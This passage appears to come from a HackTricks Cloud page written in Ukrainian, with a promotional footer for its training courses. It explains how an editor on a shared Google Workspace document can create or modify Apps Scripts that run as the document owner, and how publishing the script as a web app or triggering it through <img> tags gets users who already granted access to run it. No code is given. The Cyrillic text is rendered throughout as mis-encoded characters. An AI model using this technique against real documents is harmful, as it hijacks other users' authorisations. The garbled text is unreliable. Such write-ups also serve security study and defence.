–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ —Ö—Ç–æ—Å—å **–ø–æ–¥—ñ–ª–∏–≤—Å—è** –∑ –≤–∞–º–∏ –¥–æ–∫—É–º–µ–Ω—Ç–æ–º –∑ **–¥–æ—Å—Ç—É–ø–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ **App Scripts –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞**, –∞ **–í–õ–ê–°–ù–ò–ö (—Ç–≤–æ—Ä–µ—Ü—å) –¥–æ–∫—É–º–µ–Ω—Ç–∞ –±—É–¥–µ –≤–ª–∞—Å–Ω–∏–∫–æ–º App Script**.

{% hint style="warning" %}
–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ **—Ç–≤–æ—Ä–µ—Ü—å –¥–æ–∫—É–º–µ–Ω—Ç–∞ –∑'—è–≤–∏—Ç—å—Å—è —è–∫ —Ç–≤–æ—Ä–µ—Ü—å –±—É–¥—å-—è–∫–æ–≥–æ App Script**, —è–∫–∏–π —Å—Ç–≤–æ—Ä–∏—Ç—å –±—É–¥—å-—Ö—Ç–æ –∑ –¥–æ—Å—Ç—É–ø–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ.

–¶–µ —Ç–∞–∫–æ–∂ –æ–∑–Ω–∞—á–∞—î, —â–æ **App Script –±—É–¥–µ –¥–æ–≤—ñ—Ä–µ–Ω–∏–º —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ–º Workspace** —Ç–≤–æ—Ä—Ü—è –¥–æ–∫—É–º–µ–Ω—Ç–∞.
{% endhint %}

{% hint style="danger" %}
–¶–µ —Ç–∞–∫–æ–∂ –æ–∑–Ω–∞—á–∞—î, —â–æ —è–∫—â–æ **App Script –≤–∂–µ —ñ—Å–Ω—É–≤–∞–≤** —ñ –ª—é–¥–∏ –Ω–∞–¥–∞–ª–∏ **–¥–æ—Å—Ç—É–ø**, –±—É–¥—å-—Ö—Ç–æ –∑ **–¥–æ–∑–≤–æ–ª–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞** –Ω–∞ –¥–æ–∫—É–º–µ–Ω—Ç –º–æ–∂–µ **–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –π–æ–≥–æ —Ç–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º –¥–æ—Å—Ç—É–ø–æ–º.**\
–©–æ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º, –≤–∞–º —Ç–∞–∫–æ–∂ –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± –ª—é–¥–∏ –∞–∫—Ç–∏–≤—É–≤–∞–ª–∏ App Script. –Ü –æ–¥–∏–Ω –∑ —Ü—ñ–∫–∞–≤–∏—Ö —Ç—Ä—é–∫—ñ–≤ - —Ü–µ **–æ–ø—É–±–ª—ñ–∫—É–≤–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç —è–∫ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫**. –ö–æ–ª–∏ **–ª—é–¥–∏**, —è–∫—ñ –≤–∂–µ –Ω–∞–¥–∞–ª–∏ **–¥–æ—Å—Ç—É–ø** –¥–æ App Script, –æ—Ç—Ä–∏–º—É—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏, –≤–æ–Ω–∏ **–∞–∫—Ç–∏–≤—É—é—Ç—å App Script** (—Ü–µ —Ç–∞–∫–æ–∂ –ø—Ä–∞—Ü—é—î –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ–≥—ñ–≤ `<img>`).
{% endhint %}

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
